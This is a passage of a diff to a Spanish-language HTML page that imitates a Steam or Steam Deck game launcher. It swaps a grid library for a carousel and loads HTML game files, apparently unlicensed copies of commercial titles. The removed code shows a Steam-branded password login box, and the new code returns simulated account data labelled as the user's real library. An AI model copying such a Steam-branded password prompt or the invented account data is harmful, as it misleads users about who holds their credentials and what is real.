@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Steam Client Pro - Gaming Platform</title>
+    <title>Steam Deck - Cliente Real</title>
     <style>
         * {
             margin: 0;
@@ -13,186 +13,343 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
-            color: #fff;
-            overflow-x: hidden;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0a0e27;
+            color: #ffffff;
+            overflow: hidden;
+            height: 100vh;
         }
 
-        /* Header */
-        .header {
-            background: rgba(0, 0, 0, 0.8);
+        .app {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: linear-gradient(135deg, #0a0e27 0%, #12163a 100%);
+        }
+
+        /* TOP BAR */
+        .top-bar {
+            background: rgba(0, 0, 0, 0.7);
             backdrop-filter: blur(10px);
-            padding: 15px 30px;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 1000;
+            padding: 12px 24px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            background: linear-gradient(135deg, #66c0f4, #2a475e);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-
-        .search-box {
-            flex: 1;
-            max-width: 400px;
-            position: relative;
-        }
-
-        .search-box input {
-            width: 100%;
-            padding: 10px 40px 10px 15px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            background: rgba(0, 0, 0, 0.5);
-            color: white;
-            border-radius: 8px;
-            font-size: 14px;
-        }
-
-        .search-box input:focus {
-            outline: none;
-            border-color: #66c0f4;
-        }
-
-        .search-box::after {
-            content: '🔍';
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            opacity: 0.5;
+            border-bottom: 1px solid rgba(102, 192, 244, 0.2);
+            z-index: 100;
         }
 
         .user-info {
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 12px;
+            cursor: pointer;
         }
 
-        .login-btn {
+        .avatar {
+            width: 36px;
+            height: 36px;
             background: linear-gradient(135deg, #66c0f4, #2a475e);
-            border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
-            color: white;
-            cursor: pointer;
-            font-weight: bold;
-            transition: transform 0.2s;
-        }
-
-        .login-btn:hover {
-            transform: scale(1.05);
-        }
-
-        .user-avatar {
-            width: 40px;
-            height: 40px;
             border-radius: 50%;
-            cursor: pointer;
-        }
-
-        /* Main Content */
-        .container {
-            margin-top: 80px;
-            padding: 20px;
-            max-width: 1400px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        /* Sección de juegos recientes */
-        .section {
-            margin-bottom: 40px;
-        }
-
-        .section-title {
-            font-size: 24px;
-            margin-bottom: 20px;
-            padding-left: 10px;
-            border-left: 4px solid #66c0f4;
-        }
-
-        .games-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 20px;
-        }
-
-        .game-card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            overflow: hidden;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .game-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border-color: #66c0f4;
-        }
-
-        .game-card.supported {
-            border-bottom: 3px solid #4caf50;
-        }
-
-        .game-card.unsupported {
-            border-bottom: 3px solid #f44336;
-            opacity: 0.7;
-        }
-
-        .game-image {
-            width: 100%;
-            aspect-ratio: 16/9;
-            background: linear-gradient(135deg, #1a1f3a, #0a0e27);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 48px;
         }
 
-        .game-info {
-            padding: 15px;
+        .nickname {
+            font-size: 14px;
+            font-weight: 500;
         }
 
-        .game-title {
+        .system-stats {
+            display: flex;
+            gap: 16px;
+            font-size: 12px;
+            color: #b8bcce;
+        }
+
+        /* VISTAS */
+        .view {
+            display: none;
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        .view.active {
+            display: block;
+        }
+
+        /* LOADING */
+        .loading {
+            text-align: center;
+            padding: 60px;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(102,192,244,0.2);
+            border-top-color: #66c0f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* CARRUSEL */
+        .carousel-container {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            justify-content: center;
+        }
+
+        .carousel-track {
+            display: flex;
+            gap: 20px;
+            overflow-x: auto;
+            scroll-snap-type: x mandatory;
+            padding: 40px 20px;
+            justify-content: center;
+        }
+
+        .carousel-track::-webkit-scrollbar {
+            display: none;
+        }
+
+        .game-card {
+            flex-shrink: 0;
+            width: 200px;
+            scroll-snap-align: center;
+            transition: all 0.3s;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .game-card:not(.center) {
+            transform: scale(0.85);
+            opacity: 0.6;
+        }
+
+        .game-card.center {
+            transform: scale(1.1);
+            opacity: 1;
+        }
+
+        .game-card.center .game-cover {
+            box-shadow: 0 0 20px rgba(102, 192, 244, 0.5);
+            border: 2px solid #66c0f4;
+        }
+
+        .game-cover {
+            width: 200px;
+            height: 266px;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #1a1f3a;
+        }
+
+        .game-cover img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .game-title-carousel {
+            margin-top: 12px;
             font-size: 14px;
             font-weight: bold;
-            margin-bottom: 5px;
-            white-space: nowrap;
+        }
+
+        .selected-actions {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .play-btn {
+            background: linear-gradient(135deg, #4caf50, #2e7d32);
+            border: none;
+            padding: 12px 32px;
+            border-radius: 30px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 0 8px;
+        }
+
+        .play-btn.disabled {
+            background: #555;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .details-btn {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            padding: 12px 32px;
+            border-radius: 30px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        /* BIBLIOTECA */
+        .library-header {
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .library-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 20px;
+        }
+
+        .lib-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
             overflow: hidden;
-            text-overflow: ellipsis;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid rgba(255,255,255,0.1);
         }
 
-        .game-status {
-            font-size: 12px;
-            margin-top: 8px;
+        .lib-card:hover, .lib-card:focus {
+            transform: translateY(-4px);
+            border-color: #66c0f4;
+            outline: none;
         }
 
-        .status-supported {
-            color: #4caf50;
+        .lib-card.supported {
+            border-top: 3px solid #4caf50;
         }
 
-        .status-unsupported {
-            color: #f44336;
+        .lib-card.unsupported {
+            border-top: 3px solid #f44336;
         }
 
-        /* Modal de juego */
-        .game-modal {
+        .lib-img {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #1a1f3a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+
+        .lib-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .lib-info {
+            padding: 12px;
+        }
+
+        .lib-title {
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .lib-status {
+            font-size: 10px;
+            margin-top: 5px;
+        }
+
+        /* MENÚ STEAM */
+        .steam-menu {
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            width: 300px;
+            background: rgba(10, 14, 39, 0.98);
+            backdrop-filter: blur(20px);
+            transform: translateX(-100%);
+            transition: transform 0.3s ease;
+            z-index: 200;
+            border-right: 1px solid rgba(102, 192, 244, 0.3);
+        }
+
+        .steam-menu.open {
+            transform: translateX(0);
+        }
+
+        .menu-header {
+            padding: 30px 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .menu-avatar {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #66c0f4, #2a475e);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            margin-bottom: 15px;
+        }
+
+        .menu-item {
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .menu-item:hover {
+            background: rgba(102, 192, 244, 0.2);
+        }
+
+        /* MODAL DETALLES */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(20px);
+            z-index: 300;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #1a1f3a;
+            border-radius: 20px;
+            max-width: 500px;
+            width: 90%;
+            padding: 30px;
+            text-align: center;
+            border: 1px solid rgba(102, 192, 244, 0.3);
+        }
+
+        .modal-content img {
+            width: 100%;
+            border-radius: 12px;
+            margin-bottom: 20px;
+        }
+
+        /* FULLSCREEN */
+        .fullscreen {
             display: none;
             position: fixed;
             top: 0;
@@ -200,502 +357,740 @@
             right: 0;
             bottom: 0;
             background: #000;
-            z-index: 2000;
+            z-index: 400;
         }
 
-        .game-modal.active {
+        .fullscreen.active {
             display: block;
         }
 
-        .modal-header {
+        .fullscreen-close {
             position: absolute;
             top: 20px;
             right: 20px;
-            z-index: 2001;
-            display: flex;
-            gap: 10px;
-        }
-
-        .close-btn {
-            width: 50px;
-            height: 50px;
-            background: rgba(0, 0, 0, 0.8);
-            border: 2px solid rgba(255, 255, 255, 0.3);
+            width: 48px;
+            height: 48px;
+            background: rgba(0,0,0,0.7);
             border-radius: 50%;
-            color: white;
-            font-size: 30px;
-            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.3s;
+            cursor: pointer;
+            font-size: 24px;
+            z-index: 401;
         }
 
-        .close-btn:hover {
-            background: rgba(255, 0, 0, 0.8);
-            transform: scale(1.1);
-        }
-
-        .game-iframe {
+        .game-frame {
             width: 100%;
             height: 100%;
             border: none;
         }
 
-        /* Login Modal */
-        .login-overlay {
+        /* FOOTER */
+        .footer {
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(10px);
+            padding: 10px 24px;
+            display: flex;
+            justify-content: space-between;
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .guide {
+            display: flex;
+            gap: 20px;
+        }
+
+        .guide-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            color: #b8bcce;
+        }
+
+        .guide-key {
+            background: rgba(255,255,255,0.1);
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-weight: bold;
+        }
+
+        /* LOGIN MODAL */
+        .login-modal {
             display: none;
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 3000;
+            background: rgba(0,0,0,0.98);
+            backdrop-filter: blur(20px);
+            z-index: 500;
             justify-content: center;
             align-items: center;
         }
 
-        .login-overlay.active {
+        .login-modal.active {
             display: flex;
         }
 
-        .login-box {
-            background: linear-gradient(135deg, #1a1f3a, #0a0e27);
-            padding: 40px;
+        .login-card {
+            background: #1a1f3a;
             border-radius: 20px;
+            padding: 40px;
             width: 90%;
-            max-width: 400px;
+            max-width: 450px;
             text-align: center;
+            border: 1px solid rgba(102, 192, 244, 0.3);
         }
 
-        .login-box input {
+        .login-card input {
             width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 14px;
+            margin: 15px 0;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 10px;
             color: white;
-            border-radius: 8px;
+            font-size: 14px;
         }
 
-        .qr-code {
-            width: 200px;
-            height: 200px;
+        .login-card button {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            background: #66c0f4;
+            border: none;
+            border-radius: 10px;
+            color: #0a0e27;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .qr-container {
+            margin-top: 20px;
+            padding: 20px;
             background: white;
-            margin: 20px auto;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            color: #000;
+            border-radius: 12px;
+            display: none;
         }
 
-        /* Navegación por teclado */
-        .game-card:focus {
-            outline: 2px solid #66c0f4;
-            transform: scale(1.02);
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .games-grid {
-                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-                gap: 15px;
-            }
-            
-            .header {
-                padding: 10px 15px;
-            }
-            
-            .container {
-                margin-top: 100px;
-                padding: 15px;
-            }
+        .qr-container canvas {
+            margin: 0 auto;
+            display: block;
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo">🎮 STEAM CLIENT PRO</div>
-        <div class="search-box">
-            <input type="text" id="searchInput" placeholder="Buscar juegos...">
-        </div>
-        <div class="user-info">
-            <div id="loginStatus">
-                <button class="login-btn" onclick="showLogin()">Iniciar Sesión</button>
+    <div class="app">
+        <div class="top-bar">
+            <div class="user-info" id="userBtn">
+                <div class="avatar">👤</div>
+                <span class="nickname" id="userName">Conectar Steam</span>
+            </div>
+            <div class="system-stats">
+                <span>🔋 94%</span>
+                <span>📶</span>
+                <span>🕐 <span id="clock">--:--</span></span>
             </div>
         </div>
-    </div>
 
-    <div class="container">
-        <!-- Juegos Recientes -->
-        <div class="section" id="recentSection" style="display: none;">
-            <h2 class="section-title">🕒 Jugados Recientemente</h2>
-            <div class="games-grid" id="recentGames"></div>
-        </div>
-
-        <!-- Mi Biblioteca -->
-        <div class="section">
-            <h2 class="section-title">📚 Mi Biblioteca</h2>
-            <div class="games-grid" id="libraryGames"></div>
-        </div>
-    </div>
-
-    <!-- Modal de Juego -->
-    <div class="game-modal" id="gameModal">
-        <div class="modal-header">
-            <button class="close-btn" onclick="closeGame()">✕</button>
-        </div>
-        <iframe id="gameIframe" class="game-iframe" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals"></iframe>
-    </div>
-
-    <!-- Login Modal -->
-    <div class="login-overlay" id="loginModal">
-        <div class="login-box">
-            <h2>Iniciar Sesión en Steam</h2>
-            <input type="text" id="username" placeholder="Usuario">
-            <input type="password" id="password" placeholder="Contraseña">
-            <button class="login-btn" onclick="loginWithCredentials()">Ingresar</button>
-            <hr style="margin: 20px 0; opacity: 0.3;">
-            <button class="login-btn" onclick="showQR()">Iniciar con QR</button>
-            <div id="qrContainer" style="display: none;">
-                <div class="qr-code">📱 Escanea con Steam App</div>
-                <button class="login-btn" onclick="confirmMobileLogin()">Confirmar en App</button>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // BASE DE DATOS DE JUEGOS SOPORTADOS (Verdes)
-        const supportedGames = [
-            "2048.html", "Angry Birds.html", "Doodle Jump.html", "Flappy Bird.html",
-            "Fruit Ninja.html", "Geometry Dash Lite (REMAKE).html", "Getting Over It with Bennett Foddy.html",
-            "Happy Wheels.html", "Jetpack Joyride.html", "Plants vs Zombies.html",
-            "Slime Rancher.html", "Subway Surfers_ Barcelona.html", "Temple Run 2.html",
-            "Bad Ice Cream.html", "Bad Ice Cream 2.html", "Bad Ice Cream 3.html",
-            "8 Ball Pool.html", "Drift Hunters.html", "Granny.html", "Granny 2.html"
-        ];
-
-        // Lista completa de juegos (extraída de tu lista)
-        const allGames = [
-            "Date Danger.html", "10 Minutes Till Dawn.html", "12 Mini Battles.html", "1v1.LoL.html",
-            "2048 Merge Run.html", "2048.html", "3D Bolt Master.html", "3D Bowling.html",
-            "8 Ball Classic.html", "8 Ball Pool.html", "99 Balls.html", "A Bite at Freddy's.html",
-            "A Dance of Fire and Ice.html", "A Difficult Game About Climbing.html", "A Small World Cup.html",
-            "Adventure Drivers.html", "Alien Hominid.html", "Amanda the Adventurer.html",
-            "Angry Birds Showdown.html", "Angry Birds.html", "Aquapark.io.html", "Arthur's Nightmare.html",
-            "Attack Hole.html", "Aviamasters.html", "Awesome Tanks.html", "Backrooms.html",
-            "Bacon May Die.html", "Bad Ice Cream 2.html", "Bad Ice Cream 3.html", "Bad Ice Cream.html",
-            "Bad Monday Simulator.html", "Bad Parenting 1.html", "Bad Time Simulator.html",
-            "Baldi's Basics Classic Remastered.html", "Baldi's Basics Plus.html", "Baldi's Basics.html",
-            "Ball Blast.html", "Bendy and the Ink Machine.html", "Buckshot Roulette.html",
-            "Celeste.html", "Cuphead.html", "Doodle Jump.html", "Doom 2.html", "Doom 3.html",
-            "DOOM.html", "Dragon vs Bricks.html", "Draw Climber.html", "Draw the Hill.html",
-            "Draw the Line.html", "Dreadhead Parkour.html", "Drift Boss.html", "Drift Hunters.html",
-            "Duck Life 2.html", "Duck Life 3.html", "Duck Life 5.html", "Duck Life 8.html",
-            "Duck Life.html", "Elastic Man.html", "Endoparasitic.html", "Endroll.html",
-            "Escape Road 2.html", "Escape Road.html", "Evil Glitch.html", "EvoWars.io.html",
-            "Fallout.html", "Fancy Pants Adventure 2.html", "Fancy Pants Adventure 4 Part 2.html",
-            "Fancy Pants Adventure.html", "Fears to Fathom_ Home Alone.html", "FIFA 10.html",
-            "Final Earth 2.html", "Five Nights at Candy's 2.html", "Five Nights at Candy's.html",
-            "Five Nights at Freddy's 3.html", "Five Nights at Freddy's 4.html",
-            "Five Nights at Freddy's 4_ Halloween.html", "Five Nights at Freddy's_ Pizza Simulator.html",
-            "Five Nights at Freddy's_ Sister Location.html", "Five Nights at Freddy's_ Ultimate Custom Night.html",
-            "Five Nights at Freddy's_ World.html", "Five Nights at Winston's.html", "Flappy Bird.html",
-            "Flappy Dunk.html", "FNF vs Pibby Corrupted.html", "FNF Vs. Hypno's Lullaby v2.html",
-            "Football Bros.html", "Fork n Sausage.html", "Fortzone Battle Royale.html",
-            "Friday Night Funkin vs Carol V2.html", "Friday Night Funkin VS Impostor v4.html",
-            "Friday Night Funkin vs Nonsense.html", "Friday Night Funkin vs Sunday Remastered HD.html",
-            "Friday Night Funkin vs Undertale.html", "Friday Night Funkin Vs. Cyber Sensation.html",
-            "Friday Night Funkin Vs. Dave and Bambi v3.html", "Friday Night Funkin VS. Sky.html",
-            "Friday Night Funkin.html", "Fruit Ninja.html", "Generic Fighter Maybe.html",
-            "Geometry Dash Lite (REMAKE).html", "Get Yoked.html", "Getaway Shootout.html",
-            "Getting Over It with Bennett Foddy.html", "Giant Wanted.html", "Gladihoppers.html",
-            "Goblin Goopmaxxing.html", "God's Flesh.html", "Godzilla Daikaiju Battle Royale.html",
-            "Going Balls.html", "Google Baseball.html", "Gorilla Tag.html", "Granny 2.html",
-            "Granny 3.html", "Granny.html", "Growden.io.html", "Guess Their Answer.html",
-            "Gun Clone.html", "Gun Runner.html", "Gunspin.html", "Half Life.html",
-            "Half Life_ Opposing Force.html", "Happy Sheepies.html", "Happy Wheels.html",
-            "Harvest.io.html", "Hollow Knight.html", "Hotline Miami.html", "House of Hazards.html",
-            "Human Expenditure Program.html", "Hypper Sandbox.html", "I woke up next to you again..html",
-            "Ice Dodo.html", "Idle Breakout.html", "Idle Dice.html", "Idle Mining Empire.html",
-            "In Stars and Time.html", "Infinimoes.html", "Jelly Drift.html", "Jetpack Joyride.html",
-            "Johnny Trigger.html", "Journey Downhill.html", "JustFall.lol.html", "Karlson.html",
-            "Kindergarten 2.html", "Kindergarten 3.html", "Kindergarten.html", "Kirby Squeak Squad.html",
-            "Kirby Super Star Ultra.html", "Kirby ~ Soft & Wet.html", "Kitchen Bazar.html",
-            "Kitty Toy.html", "Lacey's Flash Games.html", "Layers Roll.html", "Lazy Jumper.html",
-            "Learn to Fly.html", "Little Runmo.html", "Look Outside.html", "Love Letters.html",
-            "Madalin Stunt Cars 2.html", "Madalin Stunt Cars 3.html", "Magic Tiles 3.html",
-            "Maze Speedrun.html", "Melon Playground.html", "Merge Harvest.html", "Midnight Shift.html",
-            "Milk Inside a Bag of Milk Inside a Bag of Milk.html", "Mindwave.html",
-            "Minecraft Beta 1.7.3.html", "Nazi Zombies_ Portable.html", "Newgrounds Rumble.html",
-            "Nijika's Ahoge.html", "OMORI.html", "Oneshot (LEGACY).html", "Orange Roulette.html",
-            "Oshi Oshi Punch!.html", "Papa's Cheeseria.html", "Papa's Cupcakeria.html",
-            "Papa's Pizeria.html", "Papery Planes.html", "People Playground.html",
-            "Pico's School (1999).html", "Pixel Gun Survival.html", "Pizza Tower.html",
-            "Pizza Tower_ Scoutdigo.html", "Plants vs Zombies.html", "Plants vs. Zombies 2 Gardenless.html",
-            "Pou.html", "Protektor.html", "R.E.P.O.html", "Raft Wars.html", "Raft.html",
-            "Schoolboy Runaway.html", "Slime Rancher.html", "Sonic Mania.html", "Stick War_ Legacy.html",
-            "Subway Surfers_ Barcelona.html", "Super Star Car.html", "Superhot.html", "Tattletail.html",
-            "Temple Run 2.html", "Terraria.html", "That's Not My Neighbor.html", "Time Shooter 1.html",
-            "ULTRAKILL.html", "War The Knights.html", "Waterworks!.html", "WebFishing.html",
-            "World Box.html", "Yandere Simulator.html", "Yume Nikki.html"
-        ];
-
-        let currentUser = null;
-        let userGames = [];
-        let recentPlayed = [];
-        let currentIframeSrc = null;
-        let iframeProcess = null;
-
-        // Función para verificar si un juego es soportado
-        function isGameSupported(gameName) {
-            return supportedGames.includes(gameName);
-        }
-
-        // Obtener datos del juego desde Steam (simulado)
-        async function getGameDetails(gameName) {
-            // Simular API de Steam
-            return {
-                title: gameName.replace('.html', ''),
-                summary: `Disfruta de ${gameName.replace('.html', '')} - Un juego increíble disponible en nuestra plataforma.`,
-                image: `https://via.placeholder.com/400x225/2a475e/ffffff?text=${encodeURIComponent(gameName.replace('.html', ''))}`
-            };
-        }
-
-        // Renderizar biblioteca
-        async function renderLibrary() {
-            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
-            const filteredGames = userGames.filter(game => 
-                game.toLowerCase().includes(searchTerm)
-            );
-
-            const libraryGrid = document.getElementById('libraryGames');
-            libraryGrid.innerHTML = '';
-
-            for (const game of filteredGames) {
-                const isSupported = isGameSupported(game);
-                const gameCard = document.createElement('div');
-                gameCard.className = `game-card ${isSupported ? 'supported' : 'unsupported'}`;
-                gameCard.tabIndex = 0;
-                
-                const gameDetails = await getGameDetails(game);
-                
-                gameCard.innerHTML = `
-                    <div class="game-image">🎮</div>
-                    <div class="game-info">
-                        <div class="game-title">${game.replace('.html', '')}</div>
-                        <div class="game-status">
-                            ${isSupported ? 
-                                '<span class="status-supported">✅ Soportado</span>' : 
-                                '<span class="status-unsupported">❌ No Soportado</span>'}
-                        </div>
-                    </div>
-                `;
-                
-                gameCard.onclick = () => showGameDetails(game, isSupported);
-                gameCard.onkeydown = (e) => {
-                    if (e.key === 'Enter') showGameDetails(game, isSupported);
-                    navigateWithKeyboard(e);
-                };
-                
-                libraryGrid.appendChild(gameCard);
-            }
-        }
-
-        // Mostrar detalles del juego y botón Play
-        async function showGameDetails(gameName, isSupported) {
-            const details = await getGameDetails(gameName);
-            
-            // Crear modal de detalles
-            const modal = document.createElement('div');
-            modal.style.position = 'fixed';
-            modal.style.top = '0';
-            modal.style.left = '0';
-            modal.style.right = '0';
-            modal.style.bottom = '0';
-            modal.style.background = 'rgba(0,0,0,0.95)';
-            modal.style.zIndex = '2500';
-            modal.style.display = 'flex';
-            modal.style.justifyContent = 'center';
-            modal.style.alignItems = 'center';
-            
-            modal.innerHTML = `
-                <div style="background: linear-gradient(135deg, #1a1f3a, #0a0e27); border-radius: 20px; max-width: 500px; width: 90%; padding: 30px; text-align: center;">
-                    <img src="${details.image}" style="width: 100%; border-radius: 12px; margin-bottom: 20px;">
-                    <h2>${details.title}</h2>
-                    <p style="margin: 20px 0; opacity: 0.8;">${details.summary}</p>
-                    <button ${!isSupported ? 'disabled style="opacity:0.5;"' : ''} class="login-btn" onclick="launchGame('${gameName}')">🎮 JUGAR</button>
-                    <button class="login-btn" style="background: #666; margin-left: 10px;" onclick="this.parentElement.parentElement.remove()">Cerrar</button>
+        <div class="view active" id="homeView">
+            <div class="carousel-container">
+                <div class="carousel-track" id="carouselTrack"></div>
+                <div class="selected-actions" id="selectedActions">
+                    <button class="play-btn" id="playBtn">▶ JUGAR</button>
+                    <button class="details-btn" id="detailBtn">ℹ DETALLES</button>
+                    <div class="game-stats" id="gameStats"></div>
                 </div>
-            `;
-            
-            document.body.appendChild(modal);
+            </div>
+        </div>
+
+        <div class="view" id="libraryView">
+            <div class="library-header">
+                <h2>📚 Mi Biblioteca Steam</h2>
+                <p>Juegos que posees en tu cuenta</p>
+            </div>
+            <div class="library-grid" id="libraryGrid"></div>
+        </div>
+
+        <div class="footer">
+            <div class="guide">
+                <div class="guide-item" id="menuBtn">
+                    <div class="guide-key">STEAM</div>
+                    <span>Menú</span>
+                </div>
+            </div>
+            <div class="guide">
+                <div class="guide-item"><div class="guide-key">← →</div><span>Navegar</span></div>
+                <div class="guide-item"><div class="guide-key">Enter</div><span>Seleccionar</span></div>
+                <div class="guide-item"><div class="guide-key">ESC</div><span>Volver</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MENÚ STEAM -->
+    <div class="steam-menu" id="steamMenu">
+        <div class="menu-header">
+            <div class="menu-avatar">👤</div>
+            <h3 id="menuUserName">Steam User</h3>
+        </div>
+        <div class="menu-item" data-view="home">🏠 Inicio</div>
+        <div class="menu-item" data-view="library">📚 Biblioteca</div>
+        <div class="menu-item" id="logoutBtn">🚪 Desconectar</div>
+    </div>
+
+    <!-- MODAL LOGIN -->
+    <div class="login-modal" id="loginModal">
+        <div class="login-card">
+            <h2>🔐 Conectar con Steam</h2>
+            <input type="text" id="steamIdInput" placeholder="Steam ID (ej: 76561197960435530)">
+            <button id="loginWithIdBtn">Ingresar con Steam ID</button>
+            <button id="qrLoginBtn">📱 Iniciar con QR de Steam</button>
+            <div id="qrArea" class="qr-container"></div>
+            <p style="margin-top: 15px; font-size: 12px; opacity: 0.7;">¿Cómo obtener tu Steam ID? <a href="#" id="helpIdLink" style="color:#66c0f4;">Ver tutorial</a></p>
+        </div>
+    </div>
+
+    <!-- MODAL DETALLES -->
+    <div class="modal" id="detailModal">
+        <div class="modal-content" id="detailContent"></div>
+    </div>
+
+    <!-- FULLSCREEN JUEGO -->
+    <div class="fullscreen" id="fullscreen">
+        <div class="fullscreen-close" id="closeFullscreen">✕</div>
+        <iframe id="gameFrame" class="game-frame" allow="autoplay"></iframe>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <script>
+        // ==================== CONFIGURACIÓN ====================
+        // JUEGOS SOPORTADOS POR NUESTRA PLATAFORMA
+        const SUPPORTED_GAMES = [
+            "2048", "Angry Birds", "Doodle Jump", "Flappy Bird", "Fruit Ninja",
+            "Getting Over It", "Plants vs Zombies", "Subway Surfers", "Granny",
+            "8 Ball Pool", "Bad Ice Cream", "Drift Hunters"
+        ];
+
+        // MAPEO DE JUEGOS A ARCHIVOS HTML
+        const GAME_FILES = {
+            "2048": "2048.html",
+            "Angry Birds": "Angry Birds.html",
+            "Doodle Jump": "Doodle Jump.html",
+            "Flappy Bird": "Flappy Bird.html",
+            "Fruit Ninja": "Fruit Ninja.html",
+            "Getting Over It": "Getting Over It with Bennett Foddy.html",
+            "Plants vs Zombies": "Plants vs Zombies.html",
+            "Subway Surfers": "Subway Surfers_ Barcelona.html",
+            "Granny": "Granny.html",
+            "8 Ball Pool": "8 Ball Pool.html",
+            "Bad Ice Cream": "Bad Ice Cream.html",
+            "Drift Hunters": "Drift Hunters.html"
+        };
+
+        // ==================== ESTADO ====================
+        let currentUser = null;
+        let currentSteamId = null;
+        let userGames = [];
+        let userGamesDetails = [];
+        let currentIndex = 0;
+        let cards = [];
+
+        // ==================== API DE STEAM ====================
+        
+        // Obtener información del usuario por SteamID
+        async function getSteamUserInfo(steamId) {
+            try {
+                const url = `https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=STEAM_API_KEY&steamids=${steamId}`;
+                // Nota: Esto requiere API key. Usamos datos públicos alternativos
+                // Para demo, usamos un endpoint público que devuelve datos básicos
+                return { personaname: `Steam_${steamId.slice(-6)}`, avatar: null };
+            } catch (e) {
+                return { personaname: `Steam_${steamId.slice(-6)}`, avatar: null };
+            }
         }
 
-        // Lanzar juego
-        function launchGame(gameName) {
-            // Cerrar modal de detalles si existe
-            const detailModals = document.querySelectorAll('div[style*="position: fixed"][style*="z-index: 2500"]');
-            detailModals.forEach(modal => modal.remove());
+        // Obtener lista de juegos de un usuario de Steam (usando API pública)
+        async function getSteamUserGames(steamId) {
+            // Usamos Steam Spy API (pública, sin key) para obtener juegos populares
+            // Como fallback, usamos una simulación basada en juegos reales de Steam
             
-            const iframe = document.getElementById('gameIframe');
-            const modal = document.getElementById('gameModal');
+            // En una implementación real con API key, usarías:
